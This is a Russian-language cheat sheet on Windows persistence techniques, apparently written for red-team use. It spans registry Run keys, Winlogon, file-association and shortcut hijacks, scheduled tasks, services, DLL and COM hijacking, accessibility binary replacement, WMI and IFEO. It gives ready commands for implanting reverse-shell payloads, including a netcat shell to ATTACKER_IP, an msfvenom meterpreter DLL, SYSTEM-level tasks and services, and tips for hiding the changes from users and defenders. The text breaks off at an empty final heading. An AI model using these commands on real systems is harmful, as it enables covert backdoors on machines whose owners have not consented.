# Presistance library

## 1. Startup folder
Это очень старый практикуемый метод. 
Размещение программы в папке автозагрузки также приведет к запуску этой программы при входе пользователя в систему. 
Существует папка автозагрузки для отдельных учетных записей пользователей, а также общесистемная папка автозагрузки, которая будет проверяться независимо от того, какая учетная запись пользователя входит в систему.

    C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup.
    C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp


## 2. Registry Autorun
Это распространенный метод. 
Вы можете заставить пользователя выполнить программу при входе в систему через реестр.
Вместо того, чтобы отправлять полезную информацию в определенный каталог, вы можете использовать следующие записи реестра, чтобы указать приложения, которые будут запускаться при входе в систему:

Записи реестра в разделе HKCU будут применяться только к текущему пользователю, а записи в разделе HKLM будут применяться ко всем. 
Любая программа, указанная в разделе `Run keys`, будет запускаться при каждом входе пользователя в систему.
Программы, указанные в разделе `RunOnce keys`, будут выполняться только один раз.

### Как это работает?(POC)
    REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
Имя записи может быть любым, которое вам нравится, а значением будет команда, которую мы хотим выполнить.
    
    reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v “NewEntryName” /t REG_EXPAND_SZ /d “Path\To\ReverseShell\Payload” /f
    New-ItemRegistryPath -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run New-ItemPropertyValue -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name “NewEntryName” -PropertyType REG_EXPAND_SZ -Value “Path\To\ReverseShell\Payload”

https://imgur.com/a/TEKWShS

## 3. Registry Logon Script
Это также очень классический метод, на самом деле этот метод можно разделить на две подкатегории

### Winlogon
Другой альтернативой автоматическому запуску программ при входе в систему является злоупотребление Winlogon, компонентом Windows, который загружает ваш профиль пользователя сразу после аутентификации (среди прочего).

Winlogon использует некоторые разделы реестра в разделе `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`

https://imgur.com/a/b1UBNkW

Здесь важную роль играют два раздела реестра: shell и Userinit

    userinit.exe, которые отвечают за восстановление настроек вашего профиля пользователя.
    explorer.exe.

Здесь мы можем заменить значение исполняемого файла в shell или Userinit реестра, но это нарушит последовательность входа в систему в Windows, вместо этого мы можем добавить команды, разделенные запятой, и Winlogon обработает их все.
### Как это работает?(POC)
Userinit reg key:

    reg add “HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon” /v Userinit /t REG_SZ /d “C:\Windows\System32\userinit.exe,C:\Windows\ReverseShell\Payload.exe” /f
    New-ItemPropertyValue -Path HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -Name Userinit -Value C:\Windows\System32\userinit.exe,C:\Windows\ReverseShell\Payload.exe -Type REG_SZ

https://imgur.com/a/QUCQqyE

### Logon Scripts
Одна из функций, выполняемых userinit.exe при загрузке вашего профиля пользователя, заключается в проверке наличия переменной среды UserInitMprLogonScript.
Мы можем использовать эту переменную среды, чтобы назначить пользователю сценарий входа в систему, который будет запущен при входе в систему. 
Переменная не задана по умолчанию, поэтому мы можем просто создать ее и назначить любой скрипт, который нам нравится.

Обратите внимание, что у каждого пользователя есть свои собственные переменные среды, поэтому вам нужно будет использовать бэкдор для каждой из них отдельно.

Реестр для этой переменной`(UserInitMprLogonScript)` находится по адресу: `HKCU\Environment`

Обратите внимание, что этот раздел реестра не имеет аналога в HKLM, поэтому ваш бэкдор применяется только к текущему пользователю.

### Как это работает?(POC)
UserInitMprLogonScript:

    reg add HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d C:\Windows\ReverseShell\Payload.exe /f
    New-ItemPropertyValue -Path HKCU:\Environment -Name UserInitMprLogonScript -Value C:\Windows\ReverseShell\Payload.exe -Type REG_SZ

https://imgur.com/a/suABiaM

## 4. Hijack Default File Extension

Это очень хитрый метод, здесь мы можем перехватить любую file association, чтобы заставить OS запускать оболочку всякий раз, когда пользователь открывает файл определенного типа

File association от OS по умолчанию хранятся в реестре, где для каждого отдельного типа файлов хранится ключ в разделе `HKLM\Software\Classes\`. Допустим, мы хотим проверить, какая программа используется для открытия файлов `.txt`; мы можем просто пойти и проверить раздел `.txt` и найти, какой программный идентификатор`(ProgID)` связан с ним. 
`ProgID` - это просто идентификатор программы, установленной в системе. Для текстовых файлов у нас будет следующий ProgID:

Обратите внимание, что мы можем использовать этот метод сохранения для файлов любого типа:
https://imgur.com/a/pjWygGP
Затем мы можем найти подраздел для соответствующего ProgID (также в разделе `HKLM\Software\Classes\`), в данном случае txtfile, где мы найдем ссылку на программу, отвечающую за обработку текстовых файлов. 

Большинство записей `ProgID` будут иметь подраздел в разделе `shell\open\command`, где указана команда по умолчанию, которая будет выполняться для файлов с таким расширением, например:
https://imgur.com/a/pzyhirE

В этом случае при попытке открыть текстовый файл система выполнит команду `%SystemRoot%\system32\NOTEPAD.EXE %1`, где `%1` - это имя открытого файла. 
Если мы хотим взломать это расширение, мы могли бы заменить команду скриптом, который запускает бэкдор и затем открывает файл как обычно.

### Как это работает?(POC)
скрипт backdoor.ps, который запустит нашу reverse shell payload, а также откроет нужный файл. Cкрипт powershell будет выглядеть следующим образом:

    Start-Process -NoNewWindow “c:\tools\nc64.exe” “-e cmd.exe ATTACKER_IP 4448” 
    C:\Windows\system32\NOTEPAD.EXE $args[0]

Обратите внимание, что в Powershell мы должны передать `$args[0]` в notepad, так как он будет содержать имя файла, который нужно открыть, как указано через `%1` в приведенном выше значении реестра.

    reg add HKLM\Software\Classes\textfile\shell\open\command /v (Default) /t REG_SZ /d “powershell -windowstylehidden C:\windows\backdoor.ps1 $1” /f
    New-ItemPropertyValue -Path HKLM:\Software\Classes\textfile\shell\open -Name (Default) -Value “powershell -windowstylehidden C:\windows\backdoor.ps1 $1” -Type REG_SZ

https://imgur.com/a/zjcVe9L

## 5. Using ShortCut Modification
Если мы хотим, чтобы Persistence был через визуалку с помощью ярлыка Windows, то это было бы лучшим способом. 
Здесь мы изменяем сам файл ярлыка. 
Вместо того, чтобы указывать непосредственно на ожидаемый исполняемый файл, мы можем изменить его, указав на вредоносный скрипт, который запустит бэкдор, а затем запустит обычную программу в обычном режиме. 
Давайте рассмотрим пример calc.exe ярлыка для POC. Если мы щелкнем по нему правой кнопкой мыши и перейдем в свойства, мы увидим, куда он указывает:

https://imgur.com/a/bpGl4VD

Теперь, что, если мы изменим его на что-то другое? Да, мы можем изменить его, запустить нашу payload , а также открыть calc

### Как это работает?(POC)
    Start-Process -NoNewWindow “c:\Windows\reversehll.exe”
    C:\Windows\System32\calc.exe

Обратите внимание, что при этом значок ярлыка может автоматически изменяться. 
Обязательно верните значок к исходному исполняемому файлу, чтобы пользователь не заметил видимых изменений.

https://imgur.com/a/QsyUn4y

## 6. using Powershell Profile
PowerShell profile (profile.ps1) - это скрипт, который запускается при запуске powershell и может использоваться в качестве logon script в систему для настройки user environments.
Powershell поддерживает несколько профилей в зависимости от пользователя или хостовой программы. Администратор также может настроить профиль, который применяется ко всем пользователям и хостовым программам на локальном компьютере.
Мы можем использовать этот профиль powershell.

Обычно существует четыре места, где вы можете abusать профиль powershell, в зависимости от привилегий, которые у вас:

    $PROFILE | select *

https://imgur.com/a/IlqHyMZ

### Как это работает?(POC)
    echo “C:\Windows\revshell.exe” > $PROFILE
- 
    -NoProfile наш желаемый payload будет выполнен, что обеспечит нам постоянный доступ.

## 7. Using Schedule Task
Scheduled tasks - это feature Windows, которая позволяет пользователям автоматизировать задачи, планируя их выполнение в определенное время или с определенными интервалами. 
Но мы можем abus'ить эту функцию Windows, чтобы получить постоянный доступ к компьютеру, установив время, когда должен быть запущен исполняемый файл. 
Существует три распространенных типа Persistence access, которые мы можем использовать: 

### Regular User Task Based Persistence

Сохранение данных на основе данных обычного пользователя достигается путем планирования выполнения задачи под учетными данными обычного пользователя. 
Этот тип сохранения данных менее распространен, чем сохранение данных на основе данных пользователя с повышенными правами, поскольку его легче обнаружить и удалить. Вот как этого добиться:

    # Create the scheduled tasks to run once at 00.00
    schtasks /create /sc ONCE /st 00:00 /tn “My Malicious Task” /tr C:\Temp\revshell.exe
    # Force run it now !
    schtasks /run /tn “My Malicious Task”

### Elevated user Based Persistence

Persistence на основе Elevated user rights достигается путем планирования выполнения задачи с повышенными привилегиями, например, для администратора или системы NT authority. 
Этот тип сохранения более опасен, чем обычное пользовательское сохранение, поскольку позволяет задаче выполнять действия, недоступные обычному пользователю, такие как изменение системных настроек или доступ к конфиденциальным данным. 
Например: – С помощью cmd

    schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"

    $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Windows\revshell.exe"
    $T = New-ScheduledTaskTrigger -Daily -At 9am
    # OR
    $T = New-ScheduledTaskTrigger -Daily -At "9/30/2020 11:05:00 AM"
    $P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
    $S = New-ScheduledTaskSettingsSet
    $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
    Register-ScheduledTask "Backdoor" -InputObject $D

    schtasks /query /tn "EXISTING_TASK" /xml > out.xml
    # now modify the <Principals> section in xml file with <RunLevel>HighestAvailable</RunLevel>
    # now delete the orginal task and replace it with modified version
    schtasks /delete /tn "EXISTING_TASK" /f
    schtasks /create /tn "EXISTING_TASK" /xml out.xml

### Multi-Action Schedule task persistence
Scheduled tasks могут быть изменены для выполнения более чем одного действия. 
Это позволяет нам изменять уже существующую запланированную задачу таким образом, чтобы наряду с нашей вредоносной задачей она также выполняла запланированную законную задачу, что обеспечивает большую скрытность. 
Для задач с несколькими действиями в разделе Задача для выполнения будет отображаться несколько действий, если они указаны с помощью `schtasks.exe`

Чтобы настроить multi-action scheduled task, сначала экспортируйте scheduled task в формате XML:

    schtasks /query /tn “CHANGEME” /xml > task.xml

    Edit task.xml, adding an <Exec> stanza within <Actions>:

    <Exec>
        <Command>C:\windows\revshell.exe</Command>
        <Command>C:\Program Files\Mozilla Firefox\updater.exe</Command>
    </Exec>

    Delete the old task and install the modified task:

    schtasks /delete /tn “CHANGEME” /f
    schtasks /create /tn “CHANGEME” /xml task.xml

## 8. Using Services
Windows services предлагают отличный способ обеспечить persistence, поскольку их можно настроить на запуск в фоновом режиме при каждом запуске жертвы.
Служба - это, по сути, исполняемый файл, который запускается в фоновом режиме. 
При настройке службы вы определяете, какой исполняемый файл будет использоваться, и выбираете, будет ли служба запускаться автоматически при запуске компьютера или ее следует запускать вручную.

Существует два основных способа abus'а службами для persistence:

### Create a new Service :
Мы можем создать наш service для запуска payload:

    sc.exe create EvilService binPath= “net user Administrator Passwd123” start= auto
    sc.exe start EvilService

или

    sc.exe create Evilservice2 binPath= “C:\windows\revshell.exe” start= auto
    sc.exe start Evilservice2

### Modifying the existing service :
Хотя создание новых служб для persistence работает достаточно эффективно, blue team может monitorить создание новых служб по всей сети.

Возможно, мы захотим повторно использовать существующую службу, а не создавать ее, чтобы избежать обнаружения. Вот как мы можем это сделать:

    # You can get a list of available services using this command
    sc.exe query state=all

    C:\> sc.exe qc Targetservice
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: Targetservice
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2 AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\MyService\Targetservice.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Targetservice
            DEPENDENCIES       :
            SERVICE_START_NAME : NT AUTHORITY\Local Service

Есть три вещи, о которых мы заботимся, когда используем службу для persistence:

Теперь давайте изменим binpath выбранной нами target service в соответствии с нашей payload

    C:\> sc.exe config Targetservice binPath= “C:\Windows\revshell.exe” start= auto obj= “LocalSystem”

## 9. Using Dll Hijacking
DLL hijacking - это метод, при котором payload injectится в search parameters приложения. 
Затем user пытается загрузить файл из этой directory, но вместо этого загружает зараженный DLL-файл. Таким образом, это может привести к прерыванию работы программы и злонамеренному управлению процессом ее запуска.

При запуске программы в память ее процесса загружается несколько библиотек DLL. Windows выполняет поиск библиотек DLL, которые требуются процессу, просматривая системные папки в определенном порядке. Перехват порядка поиска может быть использован в сценариях red teaming для persistence.

В этом методе мы пытаемся замаскироваться под библиотеку DLL, которая отсутствует в процессе Windows, чтобы выполнить произвольный код и остаться скрытым. Возможности атаки, связанные с перехватом библиотеки DLL, огромны и зависят от версии операционной системы и установленного программного обеспечения. Однако некоторые из наиболее заметных, которые могут быть использованы в Windows 7 и Windows 10, описаны тут.

### MSDTC
The Distributed Transaction Coordinator - это служба Windows, отвечающая за координацию транзакций между базами данных (SQL Server) и веб-серверами. При запуске эта служба пытается загрузить следующие три DLL-файла из System32.

Мы также можем видеть это из реестра:
https://imgur.com/a/GmpckX7

Папка System32 не содержит файла `oci.dll` в обычных Windows. 
Это дает возможность вставить в эту папку произвольную библиотеку DLL с идентичным именем(необходимы права админа), чтобы наш код мог быть запущен. DLL-файлы с payload могут быть созданы с помощью Metasploit `msfvenom` или любой другой C2.

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=1234 -f dll > oci.dll

После этого мы загрузим наш вредоносный DLL-файл в папку `%systemroot%\system32` И просто попробуем запустить службу.

    net start msdtc

Теперь давайте посмотрим, заинжектина ли наша dll из process explorer или нет:
https://imgur.com/a/ITBF2nH

как вы можете видеть, наша dll запускается.
теперь мы можем настроить ее на запуск при загрузке, чтобы сделать persistence:

    sc qc msdtc
    sc config msdtc start= auto

### MSINFO

Microsoft system information tool отвечает за сбор информации об hardware, software и sys components. В версиях Windows, таких как 8.1 и 10, этот процесс пытается загрузить отсутствующую библиотеку DLL из System32 под названием `fveapi.dll`.

Установка библиотеки DLL в этот каталог с тем же именем, что и у нее, приведет к загрузке библиотеки DLL в процесс `msinfo32.exe`
https://imgur.com/a/Qz79sXn

### Narrator

Microsoft Narrator - это приложение для чтения с экрана в среде Windows. 
Jтсутствует DLL, связанная с настройками локализации `MSTTSLocEnUS.DLL`, которая также может быть использована для выполнения произвольного кода. DLL отсутствует по следующему пути: `C:\Windows\System32\Speech\Engines\TTS\MSTTSLocEnUS.DLL`

Таким образом, мы можем разместить там нашу dll, когда процесс запустится Narrator.exe библиотека DLL будет загружена в этот процесс, как это видно из Process Explorer, и получит persistence access:
https://imgur.com/a/KvLICzS

## 10. COM Hijacking
COM Hijacking - это метод, используется, особенно в контексте Windows, для перехвата или замены законных Component Object Mode (COM) вредоносными. 
Этот метод часто используется для выполнения произвольного кода, обеспечения persistence или escalate privileges в target system.

### Understanding COM Hijacking
Component Object Model (COM) - это разработанный корпорацией Майкрософт стандарт интерфейса, который позволяет взаимодействовать различным программным компонентам. 
Он широко используется в Windows для интеграции программных компонентов.

При перехвате COM мы заменяем законный COM-объект вредоносным. 
Поскольку многие приложения используют COM-объекты для выполнения различных функций, это может привести к выполнению вредоносного кода, когда приложение попытается создать экземпляр hijacked COM object.

### Scenario of COM Hijacking Attacks
- Идентификация Target COM Object: Мы идентифицируем COM-объект, который регулярно используется приложением или процессом с высокими привилегиями.
- Создание вредоносного COM-объекта: Мы делаем вредоносный COM-объект, который имитирует функциональность target объекта, но содержит вредоносный код.
- Манипулирование реестром: Мы изменяем реестр Windows таким образом, чтобы он указывал на вредоносный COM-объект вместо законного. Часто это делается путем изменения ключей `CLSID (ClassID)` или `ProgID (Programmatic Identifier)` в реестре.
- Выполнение вредоносного кода: Когда целевое приложение пытается создать экземпляр hijacked COM object, выполняется вредоносный код, который потенциально может привести к несанкционированным действиям.

## 11. COM Proxying

COM Proxying - это method, включает в себя перехват или манипулирование связью между COM-клиентами и серверами.
Этот метод может использоваться для различных целей, включая мониторинг, изменение передаваемых данных или перенаправление COM-вызовов на различные объекты или серверы.

### Understanding COM Proxying
Component Object Model (COM) в Windows позволяет осуществлять inter-process communication. При обычной настройке COM клиентское приложение взаимодействует с COM-сервером, который предоставляет определенные функциональные возможности, доступные через интерфейсы.
Прокси-сервер COM включает в себя установку прокси-объекта между клиентом и сервером. Этот прокси-объект может перехватывать, проверять, изменять и пересылать COM-вызовы, выполняемые клиентом, на сервер. 
Он также может перенаправлять эти вызовы на другой сервер или возвращать клиенту обработанные результаты.

### Scenario of COM Proxying Attacks
- Идентификация COM-соединения: Мы идентифицируем COM-соединение клиент-сервер, которое он хочет перехватить. Это может быть соединение между стандартными компонентами Windows или между сторонними приложениями.
- Создание Proxy COM Object: Мы делаем прокси-COM-объект, который реализует те же интерфейсы, что и исходный серверный объект. Этот прокси-объект предназначен для перехвата и возможного изменения связи между клиентом и сервером.
- Установка Proxy Object: Затем мы вставляем этот прокси-объект в COM communication path. Это может быть сделано путем манипулирования реестром Windows, замены CLSID сервера на CLSID прокси-объекта или другими способами.
- Перехват COM-вызовов и манипулирование ими: Когда клиент совершает COM-вызов, он перехватывается прокси-объектом. Прокси-сервер может регистрировать этот вызов, изменять данные или выполнять другие действия, прежде чем перенаправить вызов на исходный сервер или другой сервер.

## 12. Replace binaries(Accessibility)
`Replace Binaries` метод, в котором особое внимание уделяется специальным функциям Windows, является хорошо известным методом получения persistence на системе Windows. 
Этот метод заключается в замене легитимных системных бинарников, часто связанных с функциями специальных возможностей, вредоносными исполняемыми файлами. 
Этот метод широко используется, поскольку система доверяет этим двоичным файлам с расширенным доступом и часто разрешает их выполнение с высокими привилегиями.

### Understanding Replace Binaries (Accessibility) Method
Windows включает в себя несколько accessibility features, таких как Sticky Keys, Magnifier, On-Screen Keyboard и т.д., которые предназначены для оказания помощи пользователям с ограниченными возможностями.
Эти функции могут быть вызваны с экрана входа в систему, а связанные с ними исполняемые файлы (например, `sethc.exe` для Sticky Keys, `osk.exe` для On-Screen Keyboard и т.д.) расположены в системных каталогах.

В методе `Replace Binaries` мы заменяем один из этих исполняемых файлов вредоносным. 
Когда активируется функция специальных возможностей, вместо этого запускается вредоносный исполняемый файл, что потенциально дает нам доступ к системе.

### Scenario of Replace Binaries Attacks
- Получение начального доступа: Сначала нам необходимо получить начальный доступ к системе с достаточными привилегиями для замены системных файлов.
- Идентификация таргетного бинарника: Мы определяем, какой бинарник с accessibility feature он(наш бинарник) будет заменять (например, sethc.exe).
- Замена бинарника: Мы заменяем лигитмный бинарник своим вредоносным. Для этого может потребоваться обойти системные средства защиты, такие как Windows File Protection.
- Запуск вредоносного бинарника: Вредоносный бинарник запускается при вызове соответствующей accessibility feature, обычно с экрана входа в систему.

## 13. Create symlink(Accessibility)
Creating symbolic links (symlinks) для замены или перенаправления Accessibility features Windows - это еще один метод, который мы можем использовать для persistence. 
Этот подход более тонкий, чем простая замена бинарников, поскольку он включает в себя создание symlink, которая указывает вместо лигитимнго системного файла или функции к нашему вредоносному бинарнику. 
Когда система или пользователь пытаются получить доступ к оригинальному файлу или функции, они неосознанно перенаправляются на вредоносный бинарник.

### Understanding Create Symlink (Accessibility) Method
Windows Accessibility features, c использованием такого метода как `Replace Binaries`, часто становятся мишенью из-за высокого уровня доверия и привилегий в системе к Windows Accessibility features. 
Однако вместо замены реальных исполняемых файлов этот метод предполагает создание symlink. 
symlink - это тип файла, который содержит ссылку на другой файл или каталог.

В этом контексте мы можем создать symlink, которая указывает на лигитмный исполняемый файл с функцией обеспечения Accessibility features (например, sethc.exe для залипающих ключей) на вредоносный исполняемый файл. 
Этот метод требует, чтобы мы обладали достаточными привилегиями для создания symlink в защищенных системных каталогах.

### Scenario of Create Symlink Attacks
- Получение начального доступа: нам требуется начальный доступ к системе с привилегиями, позволяющими создавать symlink в системных каталогах.
- Идентификация таргетного бинарника: мы выбираем бинарник с Windows Accessibility features для использования (например, sethc.exe).
- Создайте symlink: Мы создаем symlink из таргетного бинарника на свой вредоносный банирник.
- Запуск вредоносного бинарника: Вредоносный бинарник запускается при вызове Windows Accessibility features, обычно с экрана входа в систему.

## 14. Bitsadmin
Инструмент BITSAdmin в Windows - это инструмент командной строки, который позволяет вам создавать задания на загрузку или выгрузку файлов и отслеживать их выполнение.
Иногда используют BITSAdmin для persistence and covert data exfiltration, поскольку это лигитимный инструмент Microsoft, часто обходящий программное обеспечение безопасности, 
которое в противном случае могло бы распознавать пользовательские вредоносные программы.

### Understanding BITSAdmin for Persistence
BITS (Background Intelligent Transfer Service) - это компонент Microsoft Windows, который обеспечивает асинхронную, приоритетную и регулируемую передачу файлов между компьютерами с использованием пропускной способности сети в режиме ожидания. 
BITS обычно используется для обновления Windows и других фоновых загрузок.

Мы можем использовать BITS для обеспечения persistence, создавая задания BITS, которые загружают payload с удаленного сервера через определенные промежутки времени или при определенных условиях. 
Поскольку задания BITS могут быть настроены на повторную попытку в случае сбоя и могут сохраняться после перезагрузки, они обеспечивают скрытый способ обеспечения постоянного обновления или загрузки payload.

### Scenario of BITSAdmin Attacks
Первоначальный доступ: Сначала получаем доступ к системе с правами, достаточными для использования BITSAdmin.
Создание BITS Job: Используя BITSAdmin, создаем задание для загрузки payload с удаленного сервера.
Настройка Persistence: задание BITS настроено на повторную попытку в случае сбоя и запуск при загрузке системы, что обеспечивает Persistence.
Выполнение payload: Как только задание BITS загрузит payload, оно может быть выполнено для выполнения каких-либо действий.

## 15. Netsh helper DLL
Netsh Helper DLL - это метод, используемый для persistence в системах Windows. 
Он включает регистрацию пользовательской DLL в Netsh, утилите для создания скриптов, которая позволяет отображать или изменять сетевую конфигурацию компьютера. 
Добавляя вредоносную библиотеку DLL в качестве вспомогательного средства к Netsh, мы можем гарантировать, что наш код будет выполняться в контексте процесса Netsh, часто с повышенными привилегиями.

### Understanding Netsh Helper DLL Method
Netsh (Network Shell) поддерживает использование вспомогательных библиотек DLL для расширения своей функциональности. 
Эти вспомогательные библиотеки загружаются и запускаются при каждом запуске Netsh. 
Мы можем воспользоваться этим, зарегистрировав вредоносную библиотеку DLL в качестве вспомогательной библиотеки Netsh. 
Когда администратор или любой другой процесс запускает Netsh, запускается вредоносная библиотека DLL, обеспечивающая постоянство и потенциально повышенные привилегии.

### Scenario of Netsh Helper DLL Attacks
- Разработка вредоносной библиотеки DLL: Создаем DLL, содержащую вредоносный код для выполнения.
- Регаем DLL в Netsh(`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Netsh`): Регистрируем эту DLL в качестве вспомогательной в Netsh, используя реестр Windows.
- Выполнение через Netsh: Всякий раз, когда выполняется Netsh, вредоносная библиотека DLL также загружается и выполняется, запуская наш код.

## 16. Application shimming
Application shimming - это метод, используемый для обеспечения compatibility and persistence в энвайроменте Windows. 
Он предполагает использование инструментария Application Compatibility Toolkit (ACT), предоставляемого Microsoft, для создания shims — небольших фрагментов кода, 
которые перехватывают и модифицируют вызовы API, выполняемые приложениями. 
Несмотря на то, что оболочки предназначены для лигитимных целей, таких как устранение проблем совместимости в старых приложениях, они могут быть использованы для сохранения и скрытного выполнения вредоносного кода.

### Understanding Application Shimming
Shims, по сути, являются промежуточным звеном между приложением и операционной системой Windows. 
Когда приложение выполняет вызов API, Shim может перехватить этот вызов, изменить его или перенаправить, прежде чем передать в операционную систему. 
Мы можем создавать пользовательские Shims для выполнения своего кода в контексте лигитимных приложений, часто в обход мер безопасности.

### Scenario of Application Shimming Attacks
- Создайть Custom Shim: разрабатываем  custom shim, содержащий вредоносный код. Эта shim предназначена для срабатывания при определенных действиях или условиях в легитимном приложении.
- Установка shim: Устанавливаем shim в таргетной системе с помощью Microsoft Compatibility Administrator tool, что является частью ACT.
- Запуск и выполнение вредоносного кода: При запуске таргетного приложения и выполнении определенных условий запускается shim, выполняющая вредоносный код.

### Creating and Installing a Shim

Для создания и установки shim необходимо использовать Microsoft Compatibility Administrator tool. Вот общее описание шагов:
- Launch Microsoft Compatibility Administrator: Open the tool, which is part of the Application Compatibility Toolkit.
- Create a New Application Fix: 
    - Click on New to create a new application fix.
    - Enter the name of the program to shim, the vendor, and the program file location.
- Select Compatibility Fixes (Shims): 
    - Choose from a list of available shims. These could include fixes like RedirectFileSystem, RedirectRegistry, or ForceAdminAccess.
    - Configure the parameters of the shim based on the desired outcome.
- Test the Shim:
    - Apply the shim to the application and test it to ensure it works as intended.
- Install the Shim Database: 
    - Once the shim is tested and ready, save the database and install it on the target system. This process adds the shim to the system’s Application Compatibility Database.

### Example Commands for Application Shimming
Check it: `https://attack.mitre.org/techniques/T1546/011/`

;-

as for example:
Пока создание shims не выполняется с помощью командной строки или C++, вы можете использовать команду sdbinst для установки базы данных оболочек в целевой системе. Например:

    sdbinst -q C:\path\to\your\shim.sdb

Эта команда автоматически устанавливает файл базы данных shim (shim.sdb) без участия пользователя.

## 17. WMI subscription
Windows Management Instrumentation (WMI) - это метод, используемый для поддержания persistence в системе Windows. 
WMI - это мощная и универсальная фича Windows, используемая для различных задач управления системой. 
Мы можем использовать WMI, создавая persistent subscriptions, которые запускают вредоносные скрипты или бинарники в ответ на определенные системные события.

### Understanding WMI Subscription for Persistence
WMI subscriptions могут использоваться для выполнения кода в ответ на событие. 
Обычно это делается с помощью фильтров Event WMI и Consumers. 
Event filter определяет условие, при котором должен выполняться код, а Consumers определяет, какие действия следует предпринять при выполнении этого условия. 
Создавая event malicious filter и Consumer, мы можем обеспечить автоматическое выполнение своего кода, добиваясь persistence.

### Scenario of WMI Subscription Attacks
- Создать Malicious Script or Executable: Подготавливаем скрипт или бинарник с вредоносным кодом.
- Настраиваем WMI Event Filter: Создаем WMI Event Filter, который определяет, когда должен выполняться вредоносный код (например, при запуске системы).
- Настраиваем WMI Event Consumer: Создаем получателя евентов WMI, который запускается от Event Filter для выполнения вредоносного кода.
- Привязываем фильтр к получателю: Привязываем Event Filter к получателю событий, создавая subscription.

## 18. Active setup
Active Setup - это фича в Windows, используемая в основном системными администраторами для запуска скрипта или приложения всякий раз, когда пользователь входит в систему. 
Она предназначена для настройки профилей пользователей и пользовательских настроек. 
Однако мы можем использовать эту функцию для сохранения работоспособности, поскольку она позволяет выполнять код каждый раз, когда пользователь входит в систему.

### Understanding Active Setup for Persistence
Active Setup выполняется путем проверки разделов реестра в разделах `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components` и `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`. 
Когда пользователь входит в систему, Windows проверяет эти ключи, чтобы узнать, есть ли какие-либо команды настройки, которые необходимо выполнить для этого пользователя. 
Если команда не была выполнена для текущего профиля пользователя, она выполняет команду и затем помечает ее как выполненную.

Мы можем воспользоваться этим, добавив свои собственные ключи и команды к активным разделам реестра программы установки.
Это гарантирует, что наш вредоносный код будет выполняться при каждом входе пользователя в систему.

### Scenario of Active Setup Attacks
- Создание вредоносного бинарника: Мы подготавливаем бинарник со своим вредоносным кодом.
- Изменение реестра: Мы добавляем новый раздел в разделы реестра Active Setup с командой для запуска своего вредоносного бинарника.
- Выполнение при User Login: Каждый раз, когда новый пользователь входит в систему, система проверяет активные ключи настройки и выполняет наш код.

## 19. Image file execution options
Image File Execution Options (IFEO) - это фича в Windows, которую можно использовать для отладки. 
Она позволяет разработчикам подключать отладчик к бинарнику. 
Однако мы можем использовать эту фичу для persistence, поскольку она позволяет нам указать программу (потенциально вредоносную), 
которая будет выполняться в любое время при запуске указанного(специфичного) приложения.

### Understanding IFEO for Persistence
Настройки IFEO хранятся в реестре Windows в разделе `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. 
Добавив ключ, названный в честь исполняемого файла (например, notepad.exe), и установив значение debugger, мы можем заставить Windows выполнять другую программу под эгидой того, что это "отладчик" 
при каждом запуске указанного приложения.

### Scenario of IFEO Attacks
Создание вредоносного бинариника: Мы подготавливаем бинарник со своим вредоносным кодом.
Изменение реестра: Мы добавляем новый ключ в путь к реестру IFEO со значением отладчика, указывающим на наш вредоносный бинарник.
Выполнение при Target Application Launch: всякий раз, когда запускается указанное приложение (например, Notepad), Windows выполняет наш код.

## 20. Image file execution options(globalflag)
Image File Execution Options (IFEO) также можно использовать для persistence через раздел реестра `GlobalFlag`. 
Этот раздел обычно используется для отладки и системного анализа. 
Однако мы можем использовать параметр `GlobalFlag` для выполнения нашего кода.

### Understanding IFEO GlobalFlag for Persistence
Ключ `GlobalFlag` в IFEO используется для настройки различных параметров отладки и поведения в рамках всей системы или для каждого процесса. 
Одной из функций, которую он может включить, является загрузка DLL при каждом запуске указанного приложения. 
Это делается путем установки значения `GlobalFlag` и указания библиотеки DLL, которая будет загружена через раздел реестра `AppInit_DLLs`.

### Scenario of IFEO GlobalFlag Attacks
- Создание вредоносной DLL: Мы делаем DLL, содержащую вредоносный код.
    - Изменяем реестр для `GlobalFlag`:
        - Мы добавляет новый ключ в путь к реестру IFEO для часто используемого исполняемого файла (например, notepad.exe).
        - Мы установили значение GlobalFlag в этом ключе, чтобы включить AppInit_DLLs.
    - Изменяем AppInit_DLLs:
        - Мы изменяем раздел реестра AppInit_DLLs (расположенный в `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`), чтобы включить свою вредоносную DLL.
- Выполнение при Target Application Launch: Всякий раз, когда запускается указанное приложение, система загружает вредоносную DLL, выполняя наш код.

## 21. Time provider
The Time Provider mechanism - это фича, которая позволяет системе синхронизировать свои часы с внешним источником времени. 
Эта функция может быть использована нами для обеспечения persistence, поскольку она позволяет нам зарегистрировать вредоносную DLL в качестве Time Provider. 
При запуске Windows Time service (W32Time) она загружает зарегистрированные DLL Time Provider, что может привести к выполнению вредоносного кода.

### Understanding Time Provider for Persistence
Time Providers в Windows реализованы в виде библиотек DLL, которые загружаются Windows Time service. 
Эти библиотеки DLL зарегистрированы в реестре Windows. 
Создав и зарегистрировав вредоносную DLL в качестве Time Provider, мы можем добиться persistence, 
поскольку DLL будет загружаться и выполняться при каждом запуске Windows Time service.

### Scenario of Time Provider Attacks
